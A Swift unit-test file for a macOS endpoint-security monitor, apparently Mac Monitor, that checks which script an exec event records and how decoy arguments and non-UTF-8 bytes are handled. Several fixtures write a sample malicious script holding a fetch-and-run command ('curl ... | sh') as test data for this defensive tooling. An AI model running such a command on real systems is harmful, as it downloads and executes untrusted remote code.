//
//  ExecScriptTests.swift
//  SutroESFrameworkTests
//
//  Created by Brandon Dalton on 11/6/26.
//

import XCTest
import EndpointSecurity
@testable import SutroESFramework


// MARK: - An exec's script
/// Pins which script an exec records
/// (``ProcessExecEvent/readScript(reported:args:workingDirectory:interpreterName:reader:)``): the one ES reports wins,
/// even unread, and only without one does Mac Monitor look among the arguments.
final class ExecScriptTests: XCTestCase {
    /// The test's own user and group.
    private let me = FileReader(uid: getuid(), gid: getgid())

    /// A folder holding `evil.sh`, the script, and `decoy.txt`, a file an attacker would rather show.
    ///
    /// - Returns: The folder's path, and the script as ES reports it.
    private func scriptAndDecoy() throws -> (directory: String, script: File) {
        let directory = try makeTemporaryDirectory()
        let script = directory.appendingPathComponent("evil.sh").path
        try Data("#!/bin/bash\ncurl -s example.com | sh\n".utf8).write(to: URL(fileURLWithPath: script))
        try Data("nothing to see\n".utf8).write(to: directory.appendingPathComponent("decoy.txt"))
        var info = stat()
        XCTAssertEqual(stat(script, &info), 0)
        return (directory.path, reported(script, info))
    }

    /// A file as ES reports one.
    ///
    /// - Parameters:
    ///   - path: The file's path.
    ///   - info: Its `stat` at the exec.
    /// - Returns: The file.
    private func reported(_ path: String, _ info: stat) -> File {
        path.withCString {
            File(from: es_file_t(path: es_string_token_t(length: strlen($0), data: $0), path_truncated: false,
                                 stat: info))
        }
    }

    /// The script ES reports is read, and its path is left for ``ProcessExecEvent/enrich()``.
    func testTheReportedScriptIsRead() throws {
        let (directory, script) = try scriptAndDecoy()
        let read = ProcessExecEvent.readScript(reported: script, args: ["/bin/bash", script.path, "decoy.txt"],
                                               workingDirectory: directory, interpreterName: "bash", reader: me)
        XCTAssertNil(read.path)
        XCTAssertEqual(read.content, "#!/bin/bash\ncurl -s example.com | sh\n")
    }

    /// A reported script that can't be read, here because it changed after the exec, records no text: Mac Monitor
    /// doesn't guess the decoy among the arguments instead.
    func testTheReportedScriptWinsUnread() throws {
        let (directory, script) = try scriptAndDecoy()
        var changed = script
        changed.stat.st_size += 1
        let read = ProcessExecEvent.readScript(reported: changed, args: ["/bin/bash", "decoy.txt"],
                                               workingDirectory: directory, interpreterName: "bash", reader: me)
        XCTAssertNil(read.path)
        XCTAssertNil(read.content)
    }

    /// Without a reported script, an interpreter's script is found among its arguments.
    func testTheScriptIsFoundAmongTheArguments() throws {
        let (directory, _) = try scriptAndDecoy()
        let read = ProcessExecEvent.readScript(reported: nil, args: ["bash", "-e", "evil.sh", "decoy.txt"],
                                               workingDirectory: directory, interpreterName: "bash", reader: me)
        XCTAssertEqual(read.path, directory.appendingPathComponent("evil.sh"))
        XCTAssertEqual(read.content, "#!/bin/bash\ncurl -s example.com | sh\n")
    }

    /// `bash - evil.sh` runs `evil.sh`: a lone "-" ends a shell's options, so it doesn't hide the script.
    func testALoneDashDoesntHideTheScript() throws {
        let (directory, _) = try scriptAndDecoy()
        let read = ProcessExecEvent.readScript(reported: nil, args: ["bash", "-", "evil.sh", "decoy.txt"],
                                               workingDirectory: directory, interpreterName: "bash", reader: me)
        XCTAssertEqual(read.path, directory.appendingPathComponent("evil.sh"))
        XCTAssertEqual(read.content, "#!/bin/bash\ncurl -s example.com | sh\n")
    }

    /// `sh x.run`, which runs as a `bash` exec, records a self-extracting script's shell header: the gzip payload
    /// after it, whose bytes aren't UTF-8, doesn't make it a binary.
    func testASelfExtractingScriptFromTheArgumentsIsRead() throws {
        let directory = try makeTemporaryDirectory()
        let header = "#!/bin/sh\n"
        try (Data(header.utf8) + Data([0x1F, 0x8B, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03]))
            .write(to: directory.appendingPathComponent("x.run"))
        let read = ProcessExecEvent.readScript(reported: nil, args: ["sh", "x.run"], workingDirectory: directory.path,
                                               interpreterName: "bash", reader: me)
        XCTAssertEqual(read.path, directory.appendingPathComponent("x.run").path)
        XCTAssertEqual(read.content, header + "\u{1F}\u{FFFD}\u{08}")
    }

    /// One byte that isn't UTF-8, here in a comment, doesn't lose a script named among the arguments.
    func testAScriptWithAStrayByteFromTheArgumentsIsRead() throws {
        let directory = try makeTemporaryDirectory()
        try (Data("#!/bin/bash\n# caf".utf8) + Data([0xFF]) + Data("\ncurl -s example.com | sh\n".utf8))
            .write(to: directory.appendingPathComponent("x.sh"))
        let read = ProcessExecEvent.readScript(reported: nil, args: ["bash", "x.sh"], workingDirectory: directory.path,
                                               interpreterName: "bash", reader: me)
        XCTAssertEqual(read.path, directory.appendingPathComponent("x.sh").path)
        XCTAssertEqual(read.content, "#!/bin/bash\n# caf\u{FFFD}\ncurl -s example.com | sh\n")
    }

    /// Nothing is read without a reader, without a working directory to look in, or for an executable that isn't an
    /// interpreter.
    func testNothingIsReadWithoutWhatItNeeds() throws {
        let (directory, script) = try scriptAndDecoy()
        let args = ["bash", "evil.sh"]
        XCTAssertNil(ProcessExecEvent.readScript(reported: script, args: args, workingDirectory: directory,
                                                 interpreterName: "bash", reader: nil).content)
        XCTAssertNil(ProcessExecEvent.readScript(reported: nil, args: args, workingDirectory: nil,
                                                 interpreterName: "bash", reader: me).path)
        XCTAssertNil(ProcessExecEvent.readScript(reported: nil, args: ["cat", "evil.sh"], workingDirectory: directory,
                                                 interpreterName: "cat", reader: me).path)
    }

    /// A trace's exec names ES's script as the script, as one the Security Extension sent does, and none without one.
    func testImportedScriptPathIsESs() throws {
        let records = try fixtureRecords("eslogger-lineage.jsonl")
        var record = try XCTUnwrap(records.first { ($0["event"] as? [String: Any])?["exec"] != nil })
        XCTAssertNil(try importRecord(record).event.exec?.resolved_script_path)

        var event = try XCTUnwrap(record["event"] as? [String: Any])
        var exec = try XCTUnwrap(event["exec"] as? [String: Any])
        var script = try XCTUnwrap((exec["target"] as? [String: Any])?["executable"] as? [String: Any])
        script["path"] = "/Users/Shared/tool.sh"
        exec["script"] = script
        event["exec"] = exec
        record["event"] = event
        XCTAssertEqual(try importRecord(record).event.exec?.resolved_script_path, "/Users/Shared/tool.sh")
    }
}
